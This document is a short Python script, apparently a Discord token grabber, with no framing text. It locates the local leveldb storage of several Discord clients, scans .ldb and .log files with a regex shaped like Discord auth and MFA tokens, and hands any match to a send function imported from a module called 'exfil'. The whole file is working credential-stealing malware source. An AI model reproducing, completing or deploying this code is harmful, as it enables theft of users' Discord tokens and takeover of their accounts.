import os
import re
import glob

PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "discord", "Local Storage", "leveldb"),
    os.path.join(os.getenv("APPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
    os.path.join(os.getenv("APPDATA", ""), "discordptb", "Local Storage", "leveldb"),
    os.path.join(os.getenv("APPDATA", ""), "Lightcord", "Local Storage", "leveldb"),
    os.path.join(os.getenv("APPDATA", ""), "discorddevelopment", "Local Storage", "leveldb"),
]

TOKEN_RE = re.compile(
    r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}"
)

def find_token() -> str:
    for folder in PATHS:
        if not os.path.isdir(folder):
            continue
        for pattern in ("*.ldb", "*.log"):
            for filepath in glob.glob(os.path.join(folder, pattern)):
                try:
                    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    match = TOKEN_RE.search(content)
                    if match:
                        return match.group(0)
                except Exception:
                    continue
    return ""

def run():
    token = find_token()
    if token:
        from exfil import send
        send(token)
